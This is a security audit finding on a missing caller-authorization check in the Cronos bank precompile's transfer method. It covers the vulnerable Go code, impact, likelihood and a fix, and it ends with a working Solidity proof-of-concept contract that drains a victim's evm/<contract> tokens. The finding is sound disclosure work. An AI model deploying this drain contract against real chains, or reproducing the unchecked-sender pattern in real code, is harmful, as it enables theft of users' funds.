### Title
Unauthorized Token Transfer via Missing Caller Authorization in Bank Precompile `transfer` Method - (File: x/cronos/keeper/precompiles/bank.go)

### Summary

The `TransferMethodName` case in the bank precompile's `Run` method accepts an arbitrary `sender` address from ABI-decoded input and passes it directly to `bankKeeper.SendCoins()` without verifying that `sender == contract.Caller()`. Any EVM contract can therefore call `transfer(victim, attacker, amount)` and drain `evm/<callerAddress>` tokens from any victim address that holds them.

### Finding Description

In `x/cronos/keeper/precompiles/bank.go`, the `transfer` handler unpacks `sender` from the caller-supplied ABI arguments and uses it as the `from` address in a native bank transfer:

```go
sender := args[0].(common.Address)
recipient := args[1].(common.Address)
amount := args[2].(*big.Int)
...
from := sdk.AccAddress(sender.Bytes())
to   := sdk.AccAddress(recipient.Bytes())
...
denom := EVMDenom(contract.Caller())          // "evm/<callerAddress>"
amt   := sdk.NewCoin(denom, ...)
...
bc.bankKeeper.SendCoins(ctx, from, to, sdk.NewCoins(amt))
``` [1](#0-0) 

There is no guard of the form `if sender != contract.Caller() { return error }`. The only validation present is `checkBlockedAddr(to)`, which only rejects module-account recipients. [2](#0-1) 

The denom is bound to `contract.Caller()` (i.e., `"evm/" + callerHex`), so the attacker can only move tokens of their own contract's denom — but that is precisely the denom that the contract previously minted to users via the `mint` path, which **does** correctly use `contract.Caller()` for the denom. [3](#0-2) 

### Impact Explanation

**Critical — Unauthorized transfer of EVM-native bank tokens.**

A malicious EVM contract can:
1. Call `mint(victim, amount)` → mints `evm/<contract>` tokens to victim's Cosmos bank account.
2. Call `transfer(victim, attacker, amount)` → drains those tokens back without victim's consent.

Because `evm/<contract>` tokens are first-class Cosmos SDK bank coins, they can be held, transferred, and valued independently. The attacker achieves a complete rug-pull of any holder of the contract's native denom with no approval or signature from the victim.

### Likelihood Explanation

Any unprivileged EVM contract can reach the bank precompile at `address(0x64)` with a direct low-level call. No special role, governance action, or leaked key is required. The attack is fully self-contained in a single transaction.

### Recommendation

Enforce that the `sender` argument equals `contract.Caller()` before executing the bank transfer:

```go
case TransferMethodName:
    ...
    sender := args[0].(common.Address)
    if sender != contract.Caller() {
        return nil, errors.New("sender must be the calling contract")
    }
    ...
```

Alternatively, remove the `sender` parameter entirely and derive `from` from `contract.Caller()`, consistent with how `mint` and `burn` derive the denom from `contract.Caller()`.

### Proof of Concept

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

interface IBankPrecompile {
    function mint(address recipient, uint256 amount) external returns (bool);
    function transfer(address sender, address recipient, uint256 amount) external returns (bool);
}

contract BankDrain {
    IBankPrecompile constant bank = IBankPrecompile(address(0x64));

    // Step 1: mint evm/<this> tokens to victim
    function seedVictim(address victim, uint256 amount) external {
        bank.mint(victim, amount);
    }

    // Step 2: drain victim's evm/<this> tokens to attacker — no victim signature needed
    function drain(address victim, address attacker, uint256 amount) external {
        bank.transfer(victim, attacker, amount);
    }
}
```

`drain()` succeeds because `bank.go` uses `args[0]` (victim) as `from` in `bankKeeper.SendCoins` without checking `sender == contract.Caller()`. [1](#0-0)
